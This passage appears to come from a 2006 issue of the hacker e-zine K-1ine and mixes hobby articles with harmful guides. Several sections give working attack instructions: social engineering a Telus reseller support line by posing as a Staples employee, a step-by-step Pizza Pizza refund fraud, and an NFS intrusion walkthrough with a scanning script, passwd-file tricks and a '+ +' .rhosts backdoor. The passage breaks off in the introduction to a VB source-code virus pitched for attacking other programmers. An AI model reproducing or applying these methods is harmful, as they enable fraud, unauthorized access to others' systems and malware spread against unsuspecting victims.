intro

Welcome K-1ine readers to the special "666" (#49) issue. Why is it the "666"
issue you ask? Simple: today is the 6th month (June), 6th day, and 6th year
of the 21st century. This day, while feared by Christians and other religious
groups, has great significance for others... specifically satanists. Now
before you go e-mailing me some exceedingly ignorant/annoying hate mail, do
me one small favor: actually read up on what Satanism is really all about.

Start first by Googling the keyphrases: "Satanism" and "Anton Szandor LaVey".

Anyway, enjoy K-1ine issue #49 and sorry about the late in the day delay.
Some of us in the "real world" do actually have jobs. Surprise surprise.

Enjoy.

- The Clone

Link of the Wheneverly:

Every whenever I post one really great "link of the quarter" on each issue
of K-1ine magazine. The link can be anything in the technology industry,
music scene, rave scene, punk scene, or even a good article you read on
a news site. I'll be taking submissions via e-mail or IRC right away; so
get your links in and maybe you'll see it in the next issue of K-1ine!

For the Summer 2006 issue of K-1ine, the link of the whenever-we-feel-like-
releasing-this-motherfucking-issue is:

  http://www.churchofsatan.com/


  The official Church of Satan website as founded by Anton LaVey. Includes
  membership information, news, information about its late founding member
  Anton Szandor LaVey, and much more. A fantastic resource for people who
  may be interested in what Satanism is truly about. Or for anyone else.

  The Nine Satanic Statements

1  Satan represents indulgence, instead of abstinence!

2  Satan represents vital existence, instead of spiritual
   pipe dreams!

3  Satan represents undefiled wisdom, instead of hypocritical
   self-deceit!

4  Satan represents kindness to those who deserve it, instead of
   love wasted on ingrates!

5  Satan represents vengeance, instead of turning
   the other cheek!

6  Satan represents responsibility to the responsible,
   instead of concern for psychic vampires!

7  Satan represents man as just another animal,
   sometimes better, more often worse than those that
   walk on all-fours, who, because of his "divine spiritual
   and intellectual development," has become the
   most vicious animal of all!

8  Satan represents all of the so-called sins, as they
   all lead to physical, mental, or emotional gratification!

9  Satan has been the best friend the church has ever had,
   as he has kept it in business all these years!

Toronto 2600, working with "The Man" to help spread the word of Open Source,
and Freedom of Information.

So, it was a sunny summer day in (2003?) and Toronto2600 (http://www.to2600.org)
was approached by a journalist from the C.B.C. (Canadian Broadcasting Corporation
http://www.cbc.ca ) to talk about the "Open Source" movement, hackers, and what
the community in general was all about. 

A date was arranged to meet at "The Lab", and a handful of 2600 members where
picked out of the larger group to make sure that there was knowledgeable people
who could put forward ideas in a clear manner and not a free-for-all involving
the entire group.  Those members were, in no particular order, caesium, Grinthock,
intruder, Kris, and myself, jimmiejaz.  We sat down with "The Man" from C.B.C,
ready to inform the masses about Open Source Software, DRM, DeCSS( http://en.wiki
pedia.org/wiki/DeCSS ), and other issues facing privacy, freedom to use informat-
ion that we legally bought, CDs, DVDs on our own legal systems, running non-Micro
soft, and non-restricted media players. 

The interview lasted a couple of hours, we all had fun, a lot of laughs, parted
company and went to the pub to kill the rest of the evening.  A few weeks go by,
didn't hear anything, a few more, then a few months go by and intruder let's us
know that the interviewer had dropped by the lab with a copy of the interview on
CD, in .wma format. Dammit! we missed hearing ourselves on "The Man's" radio.
Oh well, that's how the cookie gets rejected.

We all fire up our players(mplayer,http://www.mplayerhq.hu/ xmms, http://www.xmms.
org etc...) and *WOW* Eric Raymond (http://www.catb.org/~esr/) is in the interview.
We had no idea he was part of it at the time.  But what we weren't surprised about
was the entire interview was edited down to a few sound bites. Overall, the inter-
view holds up well, even today, well, they do mention Lindows, (now called Linspire,
thanks to Microsoft strong arm tactics: http://www.techworld.com/opsys/news/index.
cfm?NewsID=1387 )

Well, it was all forgotten about until Kris brought it up out of the blue, and to
my suprise, I had what seems to the be only remaining copy in my backups.  So,
after converting the .wma to .ogg, 

mplayer OpenSource-CBC.wma -vo null -vc dummy -ao pcm && lame -m s audiodump.wav -o
OpenSource-CBC.wma

for i in *.wav; do \ SONG=`basename "$i" .wav` \ if [ -e "$i" ]; then \ oggenc -o
"$SONG.ogg" "$i" \ fi \ done (a handy script for mass conversion) and a few uploads
later, I present, Eric Raymond, Toronto2600 on C.B.C Radio discussing Open Source,
hackers and community for your enjoyment.  It is in both, .mp3(7.2M) and .ogg(5.2M) 

http://hyperupload.com/download/0269711967/OpenSource-CBC.ogg.html
http://hyperupload.com/download/01d27aae92/OpenSource-CBC.mp3.html

If the files are ever removed from those locations, email me at to2600 at gmail dot
com and I'll post them for you.

If nothing else, I hope this helps others in speaking with the media, and proving
that hackers aren't the evil kids always shown in the news.

I'd like to say a big Thank You to The Clone, Nettwerked.net, HackCanada.com and
lastly to 2600.org for providing outlets to spread Truth, Justice and above all,
the Freedom to explore, learn and share knowledge.

Having Fun With Telus Channel Care.
Written By Kab0b 

*Disclaimer*

If you're going use this to commit illegal activities I'm not responsible if you
get caught. So don't blame me.


What is Telus Channel Care?

Telus Channel Care is a Support line for Telus resellers to get support do warr-
anty ESN changes as well as probley do anything that has to do with a Telus acc-
ount. It is only for use of employees of Telus Resellers (Staples, Best Buy,
Future Shop)

Required Information.

In order for this to work you need to use some social engineering skills. If you
get caught doing anything you will most likely get a flagged account. 

First things first you are going to be a Staples Employee. You can be any store
in Alberta since they all use the same retailer code. You will sometimes be asked
for a store number so you will need to obtain that. Usually if you go into a store
and ask for the store number they will give it to you without a second thought.

The number you need to call is 1 888 446 1645. When you call that number you will
get to a IVR the menus are like this:


"Welcome To Telus Channel Care please be advised we are experiencing longer delays
than normal." It always says this and I almost never wait longer than 5 minutes.


"Press 1 For Independent and Telus Mobility stores..."

"Press 2 For Retailer Inquires..."

"In Order to get anything done you will need to press two..."

Once you press two it will ask for a retailer code. You will want to enter 06007.
This is a code that identifies you as a staples employee.

Once you enter your retailer code you will have 3 Options.

"Press 1 For Inventory Inquiries..."

"Press 2 For Pay and Talk Inquiries..."

"Press 3 For PCS Inquiries..."

"Press 4 All other Inquiries..."

After you make you selection you will get to talk to a Rep. From here you will
be able to get most anything done. Easiest thing to do is get ESN Changes at
no charge (Save $15).

To do an ESN change all you need to tell the Operator is that your name is "X".
Make up a name if the account is in your name. They will then ask for the new
ESN the 7 digit phone number as well as the pin for the account. They will
sometimes ask to talk to customer, what usually works for me is to tell the
operator that the customer has left the store and will be back in a bit to
pick up the phone and they want it ready when they come back. Usually that
will work.

The Reps are pretty used to talking to people who have no clue what they are
talking about so don't be too worried about asking stupid questions.

This will allow you to do pretty much anything to you account. If you aren't
sure just ask them they will be able to tell you how to go about getting what
you need done. Just remember: don't get caught.


<Dr-Online> I've got some freinds in the HA and a couple of other organizations
that owe me favours
<theclone> I can twist my fingers over each other.
<theclone> that's my trick.
<theclone> I have no friends :(

 Disclaimer
 ----------

 If you are going to be a stupid fuck and actually use this information for 
 attempting criminal activities you'll probably get caught.  I am releasing
 information that I have found, how you use it is your choice, and I am not 
 responsible for your actions.

 Foreword
 --------
 
 Well once again Telus is being a pain in my ass.  I got my hands on a new 
 PalmOne Treo 650 and I thought all was going to be well.  WRONG!  Besides 
 losing some features from my Palm Zire like notepad and the ability to 
 change the PalmOS wallpaper Telus rigged the bloody thing so that ringtones
 can't get installed by hand.  Well at least it looked that way.

 In the following file I will describe what the hell was happening and how 
 to get real MP3 not MIDI ringtones on your Palm Treo for only the WAP 
 charges.  Now don't sit back and tell me how basic this is, cause I am not 
 a phone phreak, and a lot of other people aren't either so it's just good 
 info to have on the internets.

 Details
 -------

 Basically I knew of two ways to get ringtones on a Treo.  You could mail 
 them to yourself, or you could beam them with IR or blue tooth.  This got 
 the ringtones to your phone but not added into the "sounds" area of the OS.  
 Well a lot of good that did me.  When you try to open the ringtone it will 
 ask you if you want to save it in sounds and you tap on OK and then it will 
 give you an error.  Ringtones must be 64K or less.  HOLY SHIT, you can't 
 make a decent ringtone from an MP3 that small. 

 Well here ya go, how to get that wicked MP3 as your ringtone.  First you 
 have to edit the MP3 to be as small as you can make it.  So take a 15 second 
 clip out of an MP3, split the left and right channels, and delete the right 
 channel, then change it to Mono.  You may also want to increase the volume of 
 this sound clip.  This can all be done with a free program called Audacity.  
 You can get this for free at http://audacity.sourceforge.net/

 Once you have the mp3 edited use audacity to export the clip as a WAV file.  
 Then email this to your treo.  I use Microsoft Active sync with my Treo and I 
 ran into some problems with the corprate email filters.  Find your own way 
 around these, or be the admin :)  Once your email has been sent sync versa 
 mail with your account and open the email.  When you open the email you will 
 see your WAV file attached to the email.  Use the directional pad on the Treo 
 to highlight the attachment.  Press the middle of the directional pad to 
 select the attachment.  Press right on the directional pad and select 
 "Select viewer ..."  Once the Treo receives the file over your WAP connection 
 select "sounds".  Then select "done".  Use the middle of the directional pad 
 to select and download the WAV file.  Save it as what you would like and select 
 "OK".  Now the Treo will save the WAV file to the device from it's memory.
 ALL RINGTONES MUST BE SAVED ON THE DEVICE, NOT ON A MEMORY CARD SO KEEP THE 
 RINGTONES SMALL.  

 Now that the WAV file is saved the "MANAGE SOUND" application will open.  
 Select your ringtone to make sure it works. Wahla it works.  Have fun with this 
 one, and yet once again I know this isn't very technical but it is kind of cool.

	   The Long Lost 780-413-XXXX Edmonton Wardial Scan


   -
   * Originally Scanned by: CYB0RG/ASM (Scanned on 01/15/99 - 01/17/99)
   * Scan Updated and published by: The Clone (last updated on 04/04/06)
   -

   Synopsis:

   CYB0RG/ASM gave me an old school Dell 386 laptop a couple weekends ago. He
   mentioned to me that he still had some old wardial scans from THC SCAN sitting
   on the laptop from several years back - January 15, 1999 to be exact (or at
   least according to the DOS directory listing). In the spirit of bordem and the
   sheer reminiscence of my younger years, I updated this particular list of Edm-
   onton Alberta wardials for the 21st century telephone phreaker and/or hacker.

   This list proves there are still carriers connected to some old server sitting
   on a machine in a closet, collecting dust. Everyone including the administrators
   have either forgotten about the dial in numbers, or they simply assume everyone
   has forgotten about dial ins. They're obviously mistaken. We haven't forgotten.

   Note: Only known carriers were listed. Not in service numbers, fax machines,
   live people, IVR (Interactive Voice Response) systems, and any other non-
   modem service have been excluded from this list. We only list the good stuff.

               Free Pizza from Pizza Pizza

           By: Guardian Angel

         Date: 2006-05-09

      Mission: Get free pizza

      Subject: Pizza Pizza

 Tools needed: A cell phone, the munchies, and about 40 mins to kill.

How it's done: Well first decide what you would like to order or if you don't
               know what you would like to order just consult their menu on the
               telephone ordering system or online at pizzapizza.ca. Once you
               have decided on your items you have to choose the store where
               your order is going to be sent and where you are going to go to
               pick it up at. The hack has a 100% success rate if you live in a
               bigger city with many pizza pizza locations but it has worked in
               small towns too. The key to choosing the locations is to find a
               street with a few pizza pizza locations on it and the further
               away from eachother the better. The hack begins... call up pizza
               pizza (416-967-1111 for Toronto or *1111 on your rogers cell
               phone) and press 0 for an order taker. Once the person answers
               s/he will ask you for your telephone # (and sometimes your name
               but you can use a fake one like joe or something) and if you
               would like pick up or delivery, you want pick up as this is the
               only way this hack will work unfortunately. The order taker will
               then ask which store you would like to pick it up at, to which
               you would say something like "umm i just moved here so i'm not
               too sure but i'm by this street in whatever city" and the order
               taker will look up that street and start listing off locations
               for you (remember the store you chose eariler for the store the
               order gets sent to and not the actual location of where you are
               going to go to pick it up) and when you hear the store you
               selected say i think that's the one. Be as vague as possible!!!
               Once you have done that she will ask you what you would like to
               order, give your order and she will then respond with your total
               and will tell you the time and that your order will be ready at
               whatever location in 20 mins or it's free. Now you will wait for
               20 mins and go to the location where you want to get your pizza
               from and tell the staff that you are there to pick your order up,
               they will ask you for your telephone number and name, give it to
               them and they will tell you that your order isn't there
               (obviously because its at the other location you chose to send
               it to) but don't allude to the fact that you know it isn't. Some
               stores will be nice and call customer service for you but if they
               are busy you will have to call yourself by following the steps
               earlier, but when the order taker comes on ask for customer
               service and you will get transferred. Once custy service answers
               they will ask you for your telephone # and what the problem is.
               Tell them you ordered pizza and it's not at the store you
               ordered it to. They will apologize to you and see what happened
               and probably ask you what store you're at, tell them to hold on
               and ask the people at the store what store you're at and make
               sure you ask loud enough for the person on the phone to hear.
               When the store tells what store, you go back on the phone and
               say "umm the store tells me i'm at such and such a location"
               the agent will then say "i'm so sorry we will send it there and
               it will be free of charge", BUT sometimes they will ask you to
               go to the other location, to which you will ask the store again
               where that store is and they will be like "thats far man!!" so
               go back to the phone and be like "um i walked here so no" and
               they will then send it to the store you're at! Now you have to
               wait another 20 mins and you will have your free food. If you
               choose to do this often choose different stores every time cause
               eventually they will catch on to you and you won't get anything.
               Good luck and enjoy your pizza!

.mounting for access.

There are some computer users and sysadmins out there that do not 
understand the dangers of mounting a filesystem. Mounting a filesystem from
a remote machine that has world read-access can allow you to get write
access. Mounting a filesystem is an easy way to share files over a 
network, and many people disregard that fact. 

Root access is required to do this, so if you dont have root, go install
Linux on your box at home. The simplest way to check if a remote host 
is able to be mounted is the

showmount -e hostname

command. If you wanted to check if say, system "mark.icp.net" is able to
have their filesystems mounted, you would type the command:

showmount -e mark.ipc.net

If mark.ipc.net does not have its filesystems mountable, you would get an
error message with something along the lines of "RPC failure: can not 
connect!" or something like that. Its not a big deal if we cant connect to
mark.ipc.net, Just try another one. Lets try XXXX.ipc.net:

# showmount -e XXXX.ipc.net

/var/spool              XXXX.ipc.net
/var/etc                XXXX.ipc.net
/home                   XXXX.ipc.net

This one still isnt very useful, the only people that can access these 
directories are people from inside XXXX.ipc.net. Oh well, try another. 
ipc.net has many boxes with mountable drives, try another ipc.net address:

# showmount -e XXXX.ipc.net

/export/home            (Everyone)

Well, this one is good news. The /home directory is able to be mounted, with
access privaleges to all! This one can be pursued further. A simple Perl
script that I picked up can be used to very easily search for domains that
have the ability to be mounted. Here it is:

--------------- start of cmount.pl
#!/usr/bin/perl -w
#
# Check NFS exports of hosts listed in file.
# (Hosts are listed, once per line with no additional whitespaces.)
#
# ii@dormroom.pyro.net - 2/27/97.

# Assign null list to @URLs which will be added to later.
my(@result) = ();
my(@domains) = ();
my($program) = "showmount -e ";

# Pull off filename from commandline. If it isn't defined, then assign default.
my($DomainFilename) = shift;
$DomainFilename = "domains" if !defined($DomainFilename);

# Do checking on input.
die("mountDomains: $DomainFilename is a directory.\n") if (-d $DomainFilename);
 
# Open $DomainFilename.
open(DOMAINFILE, $DomainFilename) or 
  die("mountDomains: Cannot open $DomainFilename for input.\n");
  
while (<DOMAINFILE>) {
  chomp($_);
  print "Now checking: $_";

  # Note difference in program output capture from "geturl.pl".  
  open (EXECFILE, "$program $_ |");
  @execResult = <EXECFILE>;
  next if (!defined($execResult[0]));
  if ($execResult[0] =~ /^Export/) {
    print " - Export list saved.";
    open (OUTFILE, ">$_.export");
    foreach (@execResult) {
      print OUTFILE;
    }
    close (OUTFILE);
  }
  close(EXECFILE);
  print "\n";
}
  
# We are done. Close all files and end the program.
close (DOMAINFILE);

0;

------end---------------

Pulled that one out of the Hack Kit. Its a very good file if you are running
Linux, sorry, no go for the windows guise. The file will view the domains
file, and will do a "showmount -e " for each one of them, and if positive
output is received, then it will cat the output to a file. 

Okay, lets pick a random address from ipc.net (this adderss doesnt exist...)
to use. Lets say that we ran a "showmount -e home.ipc.net" and it returned:

/home    (everyone)

That is good enough. The /home directory is mountable by everyone. Okay, you
understand how to find a host that allows mountable drives, here is how to
mount them. To mount a drive you would type:

# mkdir tmp/mount
# mount -nt nfs home.ipc.net:/home /tmp/mount
# cd /
# umount /tmp/mount

Thats it. The first line creates a new directory to put the mounted .home in,
that directory is /tmp/mount. The second line will mount the 
home.ipc.net:/home/ directory in /tmp/mount. Now, the mounted filesystem can
be cracked, an a user account can be created. Then, the third line moves out
of the /tmp/mount/ directory, and the fourth unmounts the filesystem. 

Now, once you have the filesystem mounted you can do things with it. If you
are planning on keeping this host mounted on your box for a long time, you
could probably put it in the /mnt/ filesystem, if its convenient. I would
usually put a mounted filesystem in the var/tmp/mount directory, but that
is just personal preferance. Okay, now a walk-through of a mounted system, 
and how to go about gaining more privaleges.

First thing, we have the mounted drive, lets change to /var/tmp/mnt
We will use the fake host "hopme.ipc.net" as the one we are pretending to
get into. By the way, this isnt a screen capture or anything. :D

First a simple ls -a, see what is in the dir.

# ls -a
home    mail    stuff   work
study   games   sbin    kerberos

All the good stuff is probably in the /home directory, so cd to it.

# cd home

Lets look at the /home directory.

# ls -l

Okay, great. We see a listing of users, lets pick "mail" since it is in a 
group all by itself. We grab "mail" and put mail in our passwd file. 
Pick an editor of your choice, and change the actual entry to suit your
wishes:

# emacs /etc/passwd

mail:x:770:2::/home:/bin/csh

Now, we add that line to our etc/passwd file, and we can get into "mail"s 
account. Normally, you would expect to do this to one, or ever more than one
user. You could even create a script to automate much of this. Once you have
added "mail" to the passwd file, you can "su - mail" to get on the mail
account:

# su - mail

Aha, thats it. You are in the mail account. You can ls to see the folder and
file listings:

# ls -l
total 7
drwxr-xr-x  5 boss      users        512 Sep  2 05:35 boss
drwxr-xr-x  5 boss      users        512 Sep  2 05:35 boss

drwxr-xr-x  2 330       users        512 Sep  2 05:35 jeff

Notice that the user number for "mail" is gone. It is gone because we are now
the rulers of "mail". We su'd to it, so its ours. Now, just we can just 
change mail's .rhosts file to include wildcards (+ +) and we can rlogin 
without a password into mail's account!

# cd mail

Change to mail's directory

# emacs .rhosts

If .rhosts doesnt exists, then you can just make it. If it does exist, you
can just add (or truncate and add) :

+ +

This small wonder will allow you to rlogin without a password! 
Then, you can get into the box and hack deeper.

               () Seeds, Prohibition and YOU ()

Seeds. They are just as illegal as the plant itself, and yet there have only
been 5 arrests in all of Canadian history, and 2 of them in the last two
months, and three of them in the last year.

Why so many busts all of a sudden? A seed company out of Montreal Quebec was
shut down recently, and yet they were part of the better business beuro for
the last 9 years.

There is currently a nation wide crackdown on seeds. This is a move made by
the Canadian government mostly due to pressure from the United States. 

Seed stores in Canada have been operating openly for years with no hassle
from the police or any other agencies. 

The mainstream media doesn't seam to want to acknowledge that these busts
are a very new thing. The TV reports seam to convey that seed busts happen
just as often as cocaine and heroin busts. 

The DEA has absolutely no business in Canada, and yet they lead the raid on
the BC Marijuana Party bookstore.

The absolute biggest reason for this hyper-paranoia of seeds has to be undo-
ubtedly the lack of education on the marijuana plant. The seeds themselves
have no THC in them and you cannot get high on the seeds alone. The seeds
cannot be considered a drug, and yet people can still get arrested for them
like they were selling a deadly substance that will kill you if you are in
the same room as it.

What does this mean for the people who want to buy seeds? It mainly means
that people will be buying out of country, mainly from Amsterdam, and
generally, seeds are not very cheap to begin with, but ordering from out
of country will make seeds even more expensive.

What does this mean for Canada and Canadian seed buyers and Canadian seed
sellers? First of all, more money will be going out of the country, while
less money will be going into the hands of legit seed sellers in Canada. 

Oh, by the way, did I mention that the seed businesses that are being bus-
ted are paying taxes for the seeds they sell? That means less money going
to the government.

It is a quadruple blow to Canadas economy to start enforcing this immoral
law. 

Lets summarize:

1) Seed sellers wont be paying taxes so less money goes to the government.
2) Seed buyers will buy out of country, sending money out of Canada.
3) Tax payers pay police officers to make raids on seed sellers.
4) Tax payers pay to keep harmless, taxpaying seed sellers in jail.

Seed sellers lose.
Seed buyers lose.
Every single Canadian who pays GST loses (That's you!)

Money isn't the only issue here. Enforcing immoral seed laws will push
the seed industry underground. Counterfeit seeds will be distributed
more freely and to get seeds a person would have to succumb to entering
shady houses where hard drugs and marijuana mix. Crime will rise. Growers
will be put at risk by having to go to shady drug houses.

Imagine, some one with terminal cancer wants a few plants to take away
the pain of therapy and help their appetite, but to get seeds they need
to go into a house were people are openly doing cocaine and where the
quality of the seeds are not guaranteed as they are now.

This is an extreme example, but this reality is not far away.

It is up to every Canadian to voice out against this crime. It is not
healthy for communities for this law to be enforced. It is not healthy
for municipalities for this law to be enforced. It is not healthy for
Provinces for this law to be enforced. It is not healthy for the Country.

Linux sysctl.conf Sample Settings and Explanations.

/etc/sysctl.conf can be a powerful way of changing kernel settings at run-time.
If you have sysctl.conf support compiled into your kernel, you can edit param-
eters in the sysctl.conf to change the way your kernel behaves. This article
will attempt to outline a number of sysctl configuration options. I've tried
to include detailed descriptions, so you can make your own judgements on what
I've recommended. Just for reference, I use Annvix ([http://www.annvix.org
www.annvix.org]) Linux and a custom 2.4.32 kernel with the OpenWall ([http://
www.openwall.org www.openwall.org]) patches installed.

 net.ipv4.ip_forward = 0
As listed, this will disable IP forwarding from this machine. This disables
the ability of this machine to act as a 
router and forward traffic to other machines.
Possible states for this option are 1 and 0.


 net.ipv4.conf.default.rp_filter = 1
 net.ipv4.conf.all.rp_filter = 1
This option attempts to verify packet source addresses using reverse patch.
This option will require that packets with a particular outgoing source
addresses also receive their replies on the same interface as they were
sent out. Possible states for this option are 1 and 0. Note: this option
has a detrimental effect on linux machines set up as a router that use
advanced or policy routing, as it has a tendancy to drop packets.


 net.ipv4.conf.all.log_martians = 1
 net.ipv4.conf.default.log_martians = 1
This option tells the kernel to log the source address of all packets with
no route back to the source address. Martian packets are seemingly "dropped
in from Mars," because we have no idea where they came from, or how to get 
them back. Kernel default is off (0). Possible states are 1 and 0.


 net.ipv4.icmp_echo_ignore_broadcasts = 1
This option instructs the kernel to ignore ICMP messages to broadcast or
multicast addresses. Helps to prevent smurf attacks among other things, and
is generally unneccessary unless you need to know how many hosts on your
network are alive. Kernel default is off (0). Possible states are 1 and 0.


 net.ipv4.icmp_ignore_bogus_error_responses = 1
This option ignores incorrectly constructed error messages.
Basically, it saves space in your logs, since some routers don't send out
proper error messages, and oh, hey look, we don't care.

Kernel deafult is off (0).
Possible states are 1 and 0.


 fs.file-max = 8192
This option specifies the max number of file handles that can be opened at
one time. Default setting is 4096.


 fs.inode-max = 32768
This option specifies the max number of inodes that can be opened at one time.
Default setting is 4096.


 net.ipv4.ip_local_port_range = 32768 61000
This option defines the range of ports that we allow clients to connect on.
The default value of this variable depends on how much RAM your machine has.
If you have more than 1024 MB of RAM, this variable will default to a lower
bound of 32768 and a higher bound of 61000. Also, see the option I added on
"tcp_tw_recycle" below.


 net.ipv4.tcp_tw_recycle = 0
This option is somewhat related to the previous option. This option has two
possible states, 1 and 0. This option enables fast recycling of sockets in
the TCP_WAIT state. This option will increase performance significantly,
but can also have an adverse effect on stability It is generally (sometimes)
fine to enable this on a local network, but is not advisable when possible
network delays ( like those found on the internet) could exist. Possible
states are 1 and 0.


 net.ipv4.tcp_syncookies = 1
When the server SYN queue is overflowed, this option enables the kernel to
send out SYN cookies to verify that the SYN packets it is recieving are
legitimate. Note that this option may help performance, but is also a vio-
lation of the TCP protocol. Should not be used as a tuning mechanism for
heavily loaded servers, instead see tcp_max_syn_backlog, tcp_synack_retries,
and tcp_abort_on_overflow. I've included information for them below.
Also note that the use of this option disables TCP window scaling. Note that
the kernel must be compiled with CONFIG_SYN_COOKIES. Default value is 0.
Possible states are 1 and 0.


 net.ipv4.tcp_max_syn_backlog = 2048
This option defines the maximum socket queue size for TCP SYN requests. This
can be used as an alternative to SYN cookies. Kernel defaults are 128 if you
have less than less than 128 MB of RAM, and 1024 if you have more than 128 MB
of RAM.


 net.ipv4.tcp_synack_retries = 5
This option defines the maximum number of attempts that the kernel will make
to establish a connected state on a TIME_WAIT connection. This option is
useful for tuning against DoS attacks such as SYN flooding as an alternative
to SYN cookies. Kernel default is 5, and each connection takes about 35 sec-
onds, so the default timeout for half-open passive TCP connections is 180
seconds. Takes an integer value, but should be left at 5 or lower, unless
there is a really good reason. Default is 5.


 net.ipv4.tcp_syn_retries = 5
This option defines the maximum number of attempts that the kernel will make
to establish a connected state on an _active_ TCP connection. Note that this
is different than tcp_synack_retries in that this relates to connections that
the kernel is making actively. Kernel default is 5, and each connection takes
about 35 seconds, so the default timeout for active TCP connections is 180
seconds. Takes an integer value, but should be left at 5 or lower, unless
there is a really good reason. Default is 5.


 net.ipv4.tcp_abort_on_overflow = 0
This option instructs the kernel to send RST responses to incoming connections
when the daemon is flooded with connect requests that the daemon cannot handle.
If this is set to 0, the system will attempt to handle all requests. As recom-
mended in the sysctl documentation, it is good to leave this as 0, unless abs-
olutely neccessary, as it may affect your clients. It's a last-ditch option.


 net.ipv4.tcp_fin_timeout = 10
This option tells the kernel how long to keep connections in the
FIN-WAIT-2 state.
If the remote end does not properly close its connection, then this
option instructs the kernel to drop the connection in 10 seconds.
Default is 60.


 net.ipv4.tcp_keepalive_time = 1800
This option tells the kernel how long to wait before sending keepalive packets
to TCP connections in a keep alive state. This setting is related to tcp_keep-
alive_probes, and tcp_keepalive_intvl, which are described below. Setting this
to 1800 will make the kernel wait 30 minutes before sending any keepalive pro-
bes to determine if the connection is still valid. For a connection in keepalive
state to be dropped, the kernel waits until tcp_keepalive_time (in our case, 60 
seconds). Then, it sends up to tcp_keepalive_probes (default 9) to determine if
the host is alive. The probes are sent at the rate defined in tcp_keepalive_intvl
(default 75, or 75 every second). Default is 7200.


 net.ipv4.tcp_keepalive_probes = 9
This option defines how many probes will be sent to a host after the keepalive
timeout is reached. Default is 9.


 net.ipv4.tcp_keepalive_intvl = 75
This option defines the interval (in seconds) between sending TCP keepalive probes.
Default is 75.

 echo "0" > /proc/sys/net/ipv4/tcp_window_scaling
Just a quick rundown of TCP windows.
There is a lot here, so I didn't feel like commenting it.
Default is on.

A "TCP window" is the maximum amount of outstanding data that a user can send on
a particular connection, before it requires a response from the reciever acknow-
ledging that the reviever has indeed received at least some of the data. The kernel
will only send data up to the TCP window size limit before waiting for a response
from the far end. The default TCP window is 32KB. This value is defined in /usr/src
/linux/include/net/tcp.h, in the setting #define MAX_TCP_WINDOW 32767U. TCP buffers
help to maximize efficiency of a connection. Having low TCP window sizes on a latent
connection (like the internet) will decrease efficiency. TCP window scaling (tcp_
window_scaling) enables TCP to use windows greater than 64KB. This works in conjun-
ction with TCP's autotuning features. TCP has an autotuning feature which will att-
empt to determine the best window sizes for connections, automatically. Disabling
the tcp_window_scaling feature disables TCP windows and autotuning. For more info-
rmation see [http://www.psc.edu/networking/projects/tcptune/ http://www.psc.edu/
networking/projects/tcptune/], and the ip-sysctl documentation.


 net.ipv4.tcp_timestamps = 0
This option instructs the kernel to disable TCP timestamps. Timestamps are used to
calculate Round-Trip Time. With this option enabled (1), data packets are sent with
timestamps, and returning ACK packets also carry timestamps. RTT can then be calc-
ulated by comparing the values. Timestamps are used by the PAWS (Protection Against
Wrapped Sequences) algorithm to ensure that TCP sequence numbers are not wrapped
before packets are delivered. Problems arise when packets are latent, and the TCP
sequence numbers wrap before the latent packets are delivered. A DoS condition can
exist in certain situations with this option enabled, as PAWS sometimes can be tr-
icked into dropping valid packets. Also, leaving this enabled means it's just "one
more thing" for the kernel to do. Default is 1. Possible values are 1 and 0.


 net.ipv4.conf.all.accept_source_route
This option will disable source routing for this machine. If this machine isn't a
router, you probably don't need source routing. Default is 1. Possible values are
1 and 0.


 net.ipv4.conf.all.send_redirects = 0
This option instructs the kernel to NOT send ICMP redirect messages. Other related
ICMP options are listed below. Possible values are 1 and 0.


 net.ipv4.ipfrag_time = 20
This option tells the handler how long to keep an IP fragment in memory, 20 seconds
in this case. Only fragments that can not yet be assembled are kept here, since
fragments that can be assembled have already been moved.


 net.ipv4.conf.all.accept_redirects = 0
Refuse to accept IP redirects We don't want someone telling us that there is a
'faster' or 'better' path, and potentially hijacking our connection. default is
on (1).


 net.ipv4.tcp_ecn = 0
don't use Explicit Congestion Notification in our packets. Some routers don't like
it.


 net.ipv4.tcp_rfc1337 = 1
This option requires compliance with RFC1337. Enabling this option will ignore
RST packets that are sent to a connection in a TIME_WAIT state. Instead, the
connection will wait for the connection to timeout like normal. I dunno what
you guys comments on this is, I usually 
leave it on.


 net.ipv4.conf.all.proxy_arp = 0
We don't really want to proxy ARP for anyone, do we? This option is turned off by
default, but just to be safe...


 net.ipv4.route.flush = 1
Disable autocaching of window sizes in the routing table.

Hello. I am going to keep the commentary on this article
short and sweet. This file is going to try to (re)introduce you
to the lost art of source code viruses.

If you hate any of the following you might enjoy this file:
-Microsoft
-People who like microsoft
-Visual Basic 6.0
-People who like visual basic 6.0
-The open source scene
-Full Disclosure of exploits and/or whitehats
-Websites where you can upload your open source visual
  basic programs for others to use, study and enjoy and/or the
  people who use those sites.
-People who like to use http://securityfocus.com to find exploits
  so they can prawn boxes because they cant make their own
  exploits.

If you love any of the following you may enjoy this file:
- Chaos/m4yh4m
- Malware/Virus/Interesting Source Code
- Ruining some one elses day
- (D)DoSing http://securityfocus.com


Chapter two is just an introduction to the code and how it will work.

Chapter three is the details of how we will add a back door and what
functions the back door will provide us. The back door part of the
virus is optional, and is not needed, but I included it anyways.

Chapter four is where I add a payload to the virus.

Chapter five is the raw virus code. It is the code as it would be
if it were not attached to any other program. This part of the code can
be used to infect other .frm files. I have included this because
it makes the virus easyer to study and understand.

Chapter six is the virus as it would be if attached to another program.
Use the code in chapter six to attack computers as explained in
chapter seven.

Do you know nothing about Visual basic, programming, viruses or
even computers? Thats ok! I make it simple enough for any 
script toddler to use this virus source to attack other 
programmers computers and take control of them! Just skip to chapter
six, Executing and spreading virus.

Chapter seven ties up loose ends.

Please note that none of the code in this article is wrapped at 80 colums.
This file is aprox. 35 pages long while in notepad at a 
1024X768 Resolution.

A final note before reading on: I wrote all the code in vb6.0 and tested
it many times. To my knowlege this program does work with logic and
syntax errors minimal. Spelling and grammer errors are a differnt story
tho. I wrote this file for the technical aspect, not to get a good grade
in English 101.


2 -       ___---=== Pseudocode and Understanding this virus ===---___

Source code viruses were much more common in the early 90s. They are rarely
seen any more except in old texts. Common source code viruses could be found
written in Basic, C and even batch.

Most of them were extreemly simple viruses and did little more than write
over other source code the virus found, destorying the program in the process.

This piece of code I have written does not destroy the source code that it
infects and leaves the program functional while still infecting other files
in the background while the code runs as inteded.

If you read the last k-1ine you might have read the 
article titled "Another Malware File" By Aftermath. 

This one is an extention of the file that Aftermath wrote.

In a nutshell, this virus finds .frm files, which are visual basic source
files stored in plain text, and adds its own code it them. One thing
Aftermaths virus did not do was spread without potentialy destroying
essential code in the original source code of the .frm file. This new
improved virus does this. It also does a lot of things the original does
not do. 

The source code you are about to see is another source code virus, except
instead of adding a bunch of text to the end of the frm file,
it adds two chunks of code at the beginning of the first two
sub functions it finds. This code is a lot less prone to 
errors and a little less obvious to detect.

 Here is an example of some high
